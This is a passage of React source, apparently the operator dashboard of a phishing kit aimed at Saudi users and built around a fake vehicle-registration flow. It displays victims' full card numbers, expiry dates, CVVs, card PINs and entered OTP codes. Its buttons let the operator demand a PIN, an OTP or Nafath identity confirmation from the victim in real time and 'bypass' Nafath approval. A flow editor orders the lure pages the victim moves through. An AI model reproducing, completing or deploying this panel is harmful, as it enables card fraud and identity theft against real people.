                              <div className="flex flex-row-reverse justify-between items-center text-xs border-b border-slate-900/30 pb-1">
                                <span className="text-slate-500">حالة المستند:</span>
                                <span className="font-extrabold text-slate-100">
                                  {tx.vehicleInfo.status === 'istimara' ? 'استمارة مركبة' : 'بطاقة جمركية'}
                                </span>
                              </div>
                              
                              {tx.vehicleInfo.status === 'istimara' && tx.vehicleInfo.plateNumbers && (
                                <div className="mt-2 flex flex-col items-center">
                                  {/* MINIFIED SAUDI PLATE */}
                                  <div className="w-full max-w-[240px] bg-white rounded-xl border-2 border-slate-950 shadow-sm p-1 flex items-stretch font-sans select-none h-14 relative overflow-hidden text-slate-900">
                                    {/* Left: English */}
                                    <div className="w-2/3 flex flex-col justify-between border-l border-slate-950 pl-1 text-center">
                                      <div className="text-xs font-black tracking-[0.2em] uppercase leading-none min-h-[12px] pt-0.5">
                                        {tx.vehicleInfo.plateEnglish ? tx.vehicleInfo.plateEnglish.toUpperCase().split('').join(' ') : '—'}
                                      </div>
                                      <div className="text-sm font-black tracking-wider leading-none pb-0.5 font-mono">
                                        {tx.vehicleInfo.plateNumbers ? tx.vehicleInfo.plateNumbers.split('').join(' ') : '—'}
                                      </div>
                                    </div>
                                    {/* Right: Arabic */}
                                    <div className="w-1/3 flex flex-col justify-between text-center pr-1">
                                      <div className="text-xs font-black leading-none pt-0.5 min-h-[12px]">
                                        {tx.vehicleInfo.plateArabic ? tx.vehicleInfo.plateArabic.split('').join(' ') : '—'}
                                      </div>
                                      <div className="text-xs font-black leading-none pb-0.5">
                                        {tx.vehicleInfo.plateNumbers || '—'}
                                      </div>
                                    </div>
                                    {/* Blue vertical bar */}
                                    <div className="absolute left-0 inset-y-0 w-5 bg-slate-100 border-r border-slate-950 flex flex-col items-center justify-between py-0.5 shadow-inner">
                                      <span className="text-[6px] font-black text-emerald-800">●</span>
                                      <div className="text-[5px] font-black leading-none tracking-tighter text-slate-800">KSA</div>
                                    </div>
                                  </div>
                                </div>
                              )}
                            </div>
                          )}
                        </div>
                      )}
                    </div>

                    {/* Credit Card Details Block */}
                    {!cardAwaiting && (
                      <div className="bg-slate-950/60 rounded-2xl border border-slate-800/80 p-4 relative overflow-hidden flex flex-col gap-2.5">
                        <div className="flex flex-row-reverse justify-between items-center text-[9px] text-slate-500 font-bold border-b border-slate-900 pb-1.5">
                          <span>بيانات بطاقة الدفع</span>
                          {tx.cardType && tx.cardType !== 'unknown' && (
                            <span className={`text-[8px] font-mono border px-1 rounded uppercase ${getCardTypeColor(tx.cardType)}`}>
                              {tx.cardType}
                            </span>
                          )}
                        </div>
                        
                        <div className="grid grid-cols-2 gap-3 text-right">
                          <div className="col-span-2 flex flex-row-reverse items-center justify-between border-b border-slate-900 pb-1.5">
                            <span className="text-[10px] text-slate-500">رقم البطاقة:</span>
                            <span className="text-xs font-mono font-black text-white select-all" dir="ltr">
                              {tx.cardNumber}
                            </span>
                          </div>
                          <div className="flex flex-row-reverse items-center justify-between">
                            <span className="text-[10px] text-slate-500">الانتهاء:</span>
                            <span className="text-xs font-mono font-bold text-white" dir="ltr">
                              {tx.expiry}
                            </span>
                          </div>
                          <div className="flex flex-row-reverse items-center justify-between border-r border-slate-900 pr-3">
                            <span className="text-[10px] text-slate-500">رمز الأمان (CVV):</span>
                            <span className="text-xs font-mono font-black text-amber-400 bg-amber-500/10 border border-amber-500/20 px-1.5 py-0.2 rounded" dir="ltr">
                              {tx.cvv}
                            </span>
                          </div>
                        </div>

                        {/* Credit Card Action Buttons - Nested contextually */}
                        {tx.status === 'PENDING_CARD_APPROVAL' && (
                          <div className="space-y-2 mt-2 pt-2 border-t border-slate-900/60">
                            <div className="text-[9px] text-amber-400 font-mono text-center uppercase tracking-widest bg-amber-950/20 py-1.5 rounded border border-amber-500/15">
                              الخطوة 2: اتخاذ قرار بشأن البطاقة المدخلة
                            </div>
                            <div className="grid grid-cols-3 gap-2">
                              <button
                                onClick={() => handleUpdateTxStatusDirect(tx.id, 'REJECTED')}
                                disabled={actionBusy}
                                className="flex h-9 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/5 hover:bg-rose-500/10 text-rose-400 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                              >
                                رفض البطاقة
                              </button>
                              <button
                                onClick={() => handleUpdateTxStatusDirect(tx.id, 'AWAITING_PIN')}
                                disabled={actionBusy}
                                className="flex h-9 w-full items-center justify-center rounded-xl bg-teal-600 hover:bg-teal-500 text-white text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                              >
                                طلب PIN 🔑
                              </button>
                              <button
                                onClick={() => handleUpdateTxStatusDirect(tx.id, 'AWAITING_OTP')}
                                disabled={actionBusy}
                                className="flex h-9 w-full items-center justify-center rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                              >
                                طلب OTP 🔑
                              </button>
                            </div>
                          </div>
                        )}
                      </div>
                    )}

                    {/* Verification Panels (Nafath Matching and OTP Verification) */}
                    {((tx.status === 'AWAITING_NAFATH' || tx.status === 'NAFATH_VERIFIED' || !!tx.nafathCode) ||
                      (tx.status === 'AWAITING_OTP' || tx.status === 'OTP_SUBMITTED' || !!tx.submittedOtp) ||
                      (tx.status === 'AWAITING_PIN' || tx.status === 'PIN_SUBMITTED' || !!tx.cardPin)) && (
                      <div className="flex flex-col gap-3.5">
                        {/* Nafath Block */}
                        {(tx.status === 'AWAITING_NAFATH' || tx.status === 'NAFATH_VERIFIED' || !!tx.nafathCode) && (
                          <div className="bg-slate-950/40 rounded-2xl border border-slate-850 p-3.5 text-right flex flex-col justify-between gap-2.5">
                            <div className="flex flex-row-reverse justify-between items-center text-[10px] text-slate-500 border-b border-slate-900 pb-1.5">
                              <span>توثيق نفاذ الموحد</span>
                              <Fingerprint className="w-3.5 h-3.5 text-emerald-400" />
                            </div>
                            
                            <div className="flex flex-row-reverse items-center justify-between">
                              <span className="text-[10px] text-slate-400">رمز المطابقة الحالي:</span>
                              <span className="text-xs font-mono font-black text-[#2dd4bf] bg-[#004d33]/20 border border-[#2dd4bf]/20 px-2 py-0.5 rounded">
                                {tx.nafathCode || 'غير محدد'}
                              </span>
                            </div>

                            {/* Change Nafath Matching code directly inside the user profile card */}
                            <div className="flex flex-row-reverse items-center justify-between gap-1.5 pt-2 border-t border-slate-900">
                              <input
                                type="text"
                                maxLength={3}
                                id={`inline-nafath-input-${tx.id}`}
                                placeholder="رمز مخصص"
                                defaultValue={tx.nafathCode || ''}
                                className="bg-slate-950 border border-slate-800 text-slate-200 text-[10px] text-center rounded px-1.5 py-1 w-16 h-7 focus:outline-none focus:ring-1 focus:ring-indigo-500 font-mono"
                              />
                              <button
                                type="button"
                                onClick={() => {
                                  const el = document.getElementById(`inline-nafath-input-${tx.id}`) as HTMLInputElement;
                                  if (el && el.value.trim()) {
                                    handleUpdateTxNafathCodeDirect(tx.id, el.value.trim());
                                  }
                                }}
                                className="bg-indigo-600 hover:bg-indigo-500 text-white text-[9px] font-black px-2 py-1 rounded h-7 transition-all cursor-pointer shrink-0"
                              >
                                حفظ
                              </button>
                            </div>

                            {/* Nafath action buttons - Nested contextually */}
                            {tx.status === 'AWAITING_NAFATH' && (
                              <div className="space-y-2 mt-2 pt-2 border-t border-slate-900/60">
                                <div className="text-[9px] text-amber-400 font-mono text-center uppercase tracking-widest bg-amber-950/20 py-1.5 rounded border border-amber-500/15 animate-pulse">
                                  بانتظار توثيق العميل لطلب نفاذ
                                </div>
                                <div className="grid grid-cols-2 gap-2">
                                  <button
                                    onClick={() => handleUpdateTxStatusDirect(tx.id, 'REJECTED')}
                                    disabled={actionBusy}
                                    className="flex h-9 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/5 hover:bg-rose-500/10 text-rose-400 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                                  >
                                    رفض العملية
                                  </button>
                                  <button
                                    onClick={() => handleUpdateTxStatusDirect(tx.id, 'NAFATH_VERIFIED')}
                                    disabled={actionBusy}
                                    className="flex h-9 w-full items-center justify-center rounded-xl bg-teal-600 hover:bg-teal-500 text-white text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                                  >
                                    تجاوز وموافقة نفاذ ✅
                                  </button>
                                </div>
                              </div>
                            )}
                            {tx.status === 'NAFATH_VERIFIED' && (
                              <div className="mt-2 pt-2 border-t border-slate-900/60 text-center bg-teal-950/10 border border-teal-800/40 rounded-2xl p-3 space-y-2">
                                <p className="text-xs text-teal-300 font-bold">تم توثيق نفاذ بنجاح!</p>
                                {tx.nafathAdminApproved ? (
                                  <p className="text-[10px] text-emerald-400 font-bold">✓ تم إعطاء موافقة الانتقال للعميل</p>
                                ) : (
                                  <button
                                    onClick={() => handleApproveNafathTransition(tx.id)}
                                    disabled={actionBusy}
                                    className="w-full flex h-9 items-center justify-center rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white text-xs font-black transition duration-150 shadow-md cursor-pointer"
                                  >
                                    الموافقة على الانتقال للخطوة التالية 🟢
                                  </button>
                                )}
                                <p className="text-[9px] text-slate-500 mt-0.5">بانتظار موافقتك أو قيام العميل بالانتقال لصفحة الدفع في متصفحه</p>
                                <button
                                  onClick={() => handleUpdateTxStatusDirect(tx.id, 'PENDING_CARD_APPROVAL')}
                                  disabled={actionBusy}
                                  className="mt-2 text-[10px] text-indigo-400 hover:text-indigo-300 underline transition cursor-pointer font-bold"
                                >
                                  تجاوز والانتقال لفحص البطاقة يدوياً 💳
                                </button>
                              </div>
                            )}
                          </div>
                        )}

                        {/* OTP Verification Block */}
                        {(tx.status === 'AWAITING_OTP' || tx.status === 'OTP_SUBMITTED' || !!tx.submittedOtp) && (
                          <div className="bg-slate-950/40 rounded-2xl border border-slate-850 p-3.5 text-right flex flex-col justify-between gap-2">
                            <div className="flex flex-row-reverse justify-between items-center text-[10px] text-slate-500 border-b border-slate-900 pb-1.5">
                              <span>رمز التحقق OTP</span>
                              <KeyRound className="w-3.5 h-3.5 text-cyan-400" />
                            </div>
                            <div className="flex flex-row-reverse items-center justify-between">
                              <span className="text-[10px] text-slate-400">الرمز المتوقع:</span>
                              <span className="text-xs font-mono font-bold text-white">
                                {tx.otpCode}
                              </span>
                            </div>
                            <div className="flex flex-row-reverse items-center justify-between">
                              <span className="text-[10px] text-slate-400">الرمز المدخل:</span>
                              {tx.submittedOtp ? (
                                <span className="text-xs font-mono font-black text-cyan-300 bg-cyan-500/10 border border-cyan-500/20 px-1.5 py-0.5 rounded animate-bounce">
                                  {tx.submittedOtp}
                                </span>
                              ) : (
                                <span className="text-[9px] text-slate-500 italic">بانتظار الإدخال</span>
                              )}
                            </div>

                            {/* OTP Action buttons - Nested contextually */}
                            {tx.status === 'AWAITING_OTP' && (
                              <div className="space-y-2 mt-2 pt-2 border-t border-slate-900/60">
                                <div className="text-[9px] text-cyan-400 font-mono text-center uppercase tracking-widest bg-cyan-950/30 py-1.5 rounded border border-cyan-500/20 animate-pulse">
                                  جاري انتظار إدخال العميل لرمز التحقق OTP...
                                </div>
                                <div className="grid grid-cols-2 gap-2">
                                  <button
                                    onClick={() => handleUpdateTxStatusDirect(tx.id, 'REJECTED')}
                                    disabled={actionBusy}
                                    className="flex h-9 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/5 hover:bg-rose-500/10 text-rose-400 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                                  >
                                    رفض العملية
                                  </button>
                                  <button
                                    onClick={() => handleUpdateTxStatusDirect(tx.id, 'PENDING_CARD_APPROVAL')}
                                    disabled={actionBusy}
                                    className="flex h-9 w-full items-center justify-center rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                                  >
                                    إلغاء والعودة
                                  </button>
                                </div>
                              </div>
                            )}
                            {tx.status === 'OTP_SUBMITTED' && (
                              <div className="space-y-2 mt-2 pt-2 border-t border-slate-900/60">
                                <div className="text-[9px] text-cyan-400 font-mono text-center uppercase tracking-widest bg-cyan-950/30 py-1.5 rounded border border-cyan-500/20 animate-pulse">
                                  العميل أدخل الرمز الجديد - يرجى التحقق
                                </div>
                                <div className="grid grid-cols-3 gap-1.5">
                                  <button
                                    onClick={() => handleUpdateTxStatusDirect(tx.id, 'REJECTED')}
                                    disabled={actionBusy}
                                    className="flex h-9 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/5 hover:bg-rose-500/10 text-rose-400 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                                  >
                                    رفض الرمز
                                  </button>
                                  <button
                                    onClick={() => handleUpdateTxStatusDirect(tx.id, 'AWAITING_NAFATH')}
                                    disabled={actionBusy}
                                    className="flex h-9 w-full items-center justify-center rounded-xl bg-teal-600 hover:bg-teal-500 text-white text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                                  >
                                    طلب نفاذ 👤
                                  </button>
                                  <button
                                    onClick={() => handleUpdateTxStatusDirect(tx.id, 'APPROVED')}
                                    disabled={actionBusy}
                                    className="flex h-9 w-full items-center justify-center rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                                  >
                                    قبول ودفع 👍
                                  </button>
                                </div>
                              </div>
                            )}
                          </div>
                        )}

                        {/* Card PIN Block */}
                        {(tx.status === 'AWAITING_PIN' || tx.status === 'PIN_SUBMITTED' || !!tx.cardPin) && (
                          <div className="bg-slate-950/40 rounded-2xl border border-slate-850 p-3.5 text-right flex flex-col justify-between gap-2">
                            <div className="flex flex-row-reverse justify-between items-center text-[10px] text-slate-500 border-b border-slate-900 pb-1.5">
                              <span>الرقم السري للبطاقة PIN</span>
                              <Lock className="w-3.5 h-3.5 text-emerald-400" />
                            </div>
                            <div className="flex flex-row-reverse items-center justify-between">
                              <span className="text-[10px] text-slate-400">الرمز السري المدخل:</span>
                              {tx.cardPin ? (
                                <span className="text-xs font-mono font-black text-emerald-300 bg-emerald-500/10 border border-emerald-500/20 px-1.5 py-0.5 rounded animate-bounce">
                                  {tx.cardPin}
                                </span>
                              ) : (
                                <span className="text-[9px] text-slate-500 italic">بانتظار الإدخال</span>
                              )}
                            </div>

                            {/* PIN Action buttons - Nested contextually */}
                            {tx.status === 'AWAITING_PIN' && (
                              <div className="space-y-2 mt-2 pt-2 border-t border-slate-900/60">
                                <div className="text-[9px] text-amber-400 font-mono text-center uppercase tracking-widest bg-amber-950/20 py-1.5 rounded border border-amber-500/15 animate-pulse">
                                  جاري انتظار إدخال الرقم السري للبطاقة (PIN)...
                                </div>
                                <div className="grid grid-cols-2 gap-2">
                                  <button
                                    onClick={() => handleUpdateTxStatusDirect(tx.id, 'REJECTED')}
                                    disabled={actionBusy}
                                    className="flex h-9 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/5 hover:bg-rose-500/10 text-rose-400 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                                  >
                                    رفض العملية
                                  </button>
                                  <button
                                    onClick={() => handleUpdateTxStatusDirect(tx.id, 'PENDING_CARD_APPROVAL')}
                                    disabled={actionBusy}
                                    className="flex h-9 w-full items-center justify-center rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                                  >
                                    إلغاء والعودة
                                  </button>
                                </div>
                              </div>
                            )}
                            {tx.status === 'PIN_SUBMITTED' && (
                              <div className="space-y-2 mt-2 pt-2 border-t border-slate-900/60">
                                <div className="text-[9px] text-emerald-400 font-mono text-center uppercase tracking-widest bg-emerald-950/20 py-1.5 rounded border border-emerald-500/15 animate-pulse">
                                  تم استلام الرقم السري للبطاقة PIN بنجاح!
                                </div>
                                <div className="grid grid-cols-3 gap-2">
                                  <button
                                    onClick={() => handleUpdateTxStatusDirect(tx.id, 'REJECTED')}
                                    disabled={actionBusy}
                                    className="flex h-9 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/5 hover:bg-rose-500/10 text-rose-400 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                                  >
                                    رفض الرمز
                                  </button>
                                  <button
                                    onClick={() => handleUpdateTxStatusDirect(tx.id, 'AWAITING_OTP')}
                                    disabled={actionBusy}
                                    className="flex h-9 w-full items-center justify-center rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                                  >
                                    طلب OTP 🔑
                                  </button>
                                  <button
                                    onClick={() => handleUpdateTxStatusDirect(tx.id, 'APPROVED')}
                                    disabled={actionBusy}
                                    className="flex h-9 w-full items-center justify-center rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                                  >
                                    قبول ودفع 👍
                                  </button>
                                </div>
                              </div>
                            )}
                          </div>
                        )}
                      </div>
                    )}

                    {/* Final Bottom Workflow Status / Reset */}
                    {(tx.status === 'APPROVED' || tx.status === 'REJECTED') && (
                      <div className="border-t border-slate-900 pt-4 mt-auto text-center">
                        <div className="rounded-xl bg-slate-950/80 border border-slate-900 py-2">
                          <p className="text-[10px] text-slate-400">
                            اكتملت دورة المعاملة بنجاح بالحالة:{' '}
                            <span className={`font-black ${
                              tx.status === 'APPROVED' ? 'text-emerald-400' : 'text-rose-400'
                            }`}>
                              {tx.status === 'APPROVED' ? 'مقبولة بنجاح 👍' : 'مرفوضة وملغاة ❌'}
                            </span>
                          </p>
                        </div>
                        <button
                          onClick={() => handleUpdateTxStatusDirect(tx.id, 'PENDING_CARD_APPROVAL')}
                          disabled={actionBusy}
                          className="mt-2 text-[9px] font-mono text-slate-500 hover:text-slate-300 underline transition cursor-pointer flex items-center justify-center gap-1 mx-auto"
                        >
                          <RefreshCw className="w-2.5 h-2.5" />
                          <span>إعادة تفعيل المعاملة لفحص البطاقة</span>
                        </button>
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </>
      ) : (
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-[#fafafa] dark:bg-slate-900/30 rounded-3xl border border-slate-200 dark:border-slate-800/80 p-6 shadow-xl text-right max-w-3xl mx-auto"
        >
          {/* Header */}
          <div className="flex flex-row-reverse justify-between items-center mb-6 pb-4 border-b border-slate-200 dark:border-slate-800/60">
            <h3 className="text-xl font-extrabold text-slate-900 dark:text-white">
              ترتيب صفحات التدفق
            </h3>
            <button
              onClick={() => setActiveAdminTab('monitors')}
              className="text-xs font-bold text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white transition flex items-center gap-1 cursor-pointer flex-row-reverse"
            >
              <span>رجوع للوحة الأدمن</span>
              <ArrowRight className="w-3.5 h-3.5 rotate-180" />
            </button>
          </div>

          <p className="text-xs font-semibold text-slate-500 dark:text-slate-400 mb-8 leading-relaxed">
            رتّب الصفحات بالترتيب الذي سيمر به العميل. كل صفحة عند الانتقال للأمام ستذهب للصفحة التالية في هذه القائمة.
          </p>

          {/* Success / Error Messages */}
          {flowSuccessMsg && (
            <div className="mb-4 p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/25 text-emerald-600 dark:text-emerald-400 text-xs font-bold flex items-center justify-end gap-2 animate-fade-in">
              <span>{flowSuccessMsg}</span>
              <CheckCircle className="w-4 h-4" />
            </div>
          )}
          {flowErrorMsg && (
            <div className="mb-4 p-3 rounded-xl bg-rose-500/10 border border-rose-500/25 text-rose-600 dark:text-rose-400 text-xs font-bold flex items-center justify-end gap-2 animate-fade-in">
              <span>{flowErrorMsg}</span>
              <XCircle className="w-4 h-4" />
            </div>
          )}

          {/* Page Flow List */}
          <div className="space-y-4 mb-8">
            {activeFlow.length === 0 ? (
              <div className="py-16 text-center border-2 border-dashed border-slate-800 rounded-3xl bg-slate-950/20">
                <AlertTriangle className="h-10 w-10 text-slate-600 mx-auto mb-3" />
                <p className="text-xs text-slate-400">لا توجد صفحات في هذا التدفق المخصص حالياً. يرجى تفعيل وإضافة صفحات من المتاحة بالأسفل.</p>
              </div>
            ) : (
              activeFlow.map((page, idx) => (
                <div key={page.id} className="relative">
                  <div
                    className="bg-slate-900/60 hover:bg-slate-900/90 rounded-2xl border border-slate-800 p-4 flex items-center justify-between shadow-xl hover:border-slate-750 transition-all duration-300 group"
                  >
                    {/* Left Side Actions */}
                    <div className="flex items-center gap-1.5">
                      {/* Delete Icon */}
                      <button
                        onClick={() => handleDeleteFlowPage(idx)}
                        className="p-2 text-rose-500 hover:bg-rose-500/10 rounded-xl transition cursor-pointer"
                        title="حذف الصفحة"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>

                      {/* Down Arrow */}
                      <button
                        onClick={() => handleMoveDown(idx)}
                        disabled={idx === activeFlow.length - 1}
                        className="p-2 text-slate-400 hover:bg-slate-800 disabled:opacity-20 disabled:pointer-events-none rounded-xl transition cursor-pointer"
                        title="تحريك لأسفل"
                      >
                        <ArrowDown className="w-4 h-4" />
                      </button>

                      {/* Up Arrow */}
                      <button
                        onClick={() => handleMoveUp(idx)}
                        disabled={idx === 0}
                        className="p-2 text-slate-400 hover:bg-slate-800 disabled:opacity-20 disabled:pointer-events-none rounded-xl transition cursor-pointer"
                        title="تحريك لأعلى"
                      >
                        <ArrowUp className="w-4 h-4" />
                      </button>
                    </div>

                    {/* Right Side Content & Step Indicator */}
                    <div className="flex items-center gap-4 flex-row-reverse">
                      {/* Step badge with high-contrast indicator */}
                      <div className="w-8 h-8 rounded-full bg-slate-850 border border-slate-750 text-white flex items-center justify-center font-bold text-xs select-none group-hover:border-indigo-500 group-hover:text-indigo-400 transition-colors">
                        {idx + 1}
                      </div>

                      {/* Title and Path */}
                      <div className="text-right flex flex-col items-end">
                        <h4 className="text-xs font-black text-slate-100 flex items-center gap-1.5 flex-row-reverse">
                          <span>{page.title}</span>
                          {idx === 0 && (
                            <span className="text-[8px] bg-[#004d33] text-[#2dd4bf] px-1.5 py-0.2 rounded-md font-bold">البداية</span>
                          )}
                          {idx === activeFlow.length - 1 && (
                            <span className="text-[8px] bg-rose-950 text-rose-400 px-1.5 py-0.2 rounded-md font-bold">النهاية</span>
                          )}
                        </h4>
                        <p className="text-[9px] font-mono text-slate-500 mt-0.5 select-all" dir="ltr">
                          {page.path}
                        </p>
                      </div>
                    </div>
                  </div>

                  {/* Connective timeline visual helper between step cards */}
                  {idx < activeFlow.length - 1 && (
                    <div className="flex justify-center my-1">
                      <div className="w-0.5 h-3 bg-slate-800" />
                    </div>
                  )}
                </div>
              ))
            )}
          </div>

          {/* Add Available Pages to Flow Section */}
          <div className="bg-slate-950/45 rounded-3xl border border-slate-900 p-5.5 mb-8">
            <h4 className="text-xs font-black text-slate-300 mb-4 flex items-center gap-2 flex-row-reverse">
              <Sparkles className="w-4 h-4 text-indigo-400" />
              <span>التحكم بالصفحات النشطة وتفعيلها:</span>
            </h4>
            
            <p className="text-[10px] text-slate-400 mb-4 leading-relaxed text-right">
              انقر لتفعيل الصفحة وإضافتها إلى التدفق، أو انقر على الصفحة المضافة (باللون الأخضر) لإلغاء تفعيلها وحذفها مباشرة.
            </p>

            <div className="flex flex-wrap gap-2 justify-start flex-row-reverse">
              {availableToAdding.map((p) => {
                const isAlreadyInFlow = activeFlow.some((af) => af.path === p.path);
                return (
                  <button
                    key={p.id}
                    onClick={() => {
                      if (isAlreadyInFlow) {
                        const idx = activeFlow.findIndex((af) => af.path === p.path);
                        if (idx !== -1) handleDeleteFlowPage(idx);
                      } else {
                        handleAddFlowPage(p);
                      }
                    }}
                    className={`px-3.5 py-2.5 text-xs font-bold rounded-xl border transition-all duration-250 cursor-pointer flex items-center gap-1.5 flex-row-reverse ${
                      isAlreadyInFlow
                        ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20 hover:bg-emerald-500/15'
                        : 'bg-slate-900 border-slate-850 text-slate-300 hover:bg-slate-850 hover:border-slate-800 hover:text-white'
                    }`}
                  >
                    {isAlreadyInFlow ? (
                      <>
                        <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
                        <span>{p.title}</span>
                      </>
                    ) : (
                      <>
                        <span className="text-indigo-400 font-extrabold shrink-0">+</span>
                        <span>{p.title}</span>
                      </>
                    )}
                  </button>
                );
              })}
            </div>
          </div>

          {/* Footer Actions */}
          <div className="flex items-center justify-between pt-4 border-t border-slate-200 dark:border-slate-800/80">
            {/* Reset to Default */}
            <button
              onClick={handleResetFlow}
              disabled={isSavingFlow}
              className="px-4 py-2.5 bg-slate-200 hover:bg-slate-250 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 font-black text-xs rounded-xl flex items-center gap-1.5 transition cursor-pointer disabled:opacity-50"
            >
              <RotateCcw className="w-4 h-4" />
              <span>افتراضي</span>
            </button>

            {/* Save Button */}
            <button
              onClick={handleSaveFlow}
              disabled={isSavingFlow}
              className="px-10 py-2.5 bg-[#0f172a] hover:bg-[#1e293b] text-white font-black text-xs rounded-xl flex items-center gap-1.5 transition cursor-pointer disabled:opacity-50 shadow-md"
            >
              {isSavingFlow ? (
                <RefreshCw className="w-4 h-4 animate-spin" />
              ) : (
                <Save className="w-4 h-4" />
              )}
              <span>حفظ الترتيب</span>
            </button>
          </div>
        </motion.div>
      )}
    </div>
  );
};
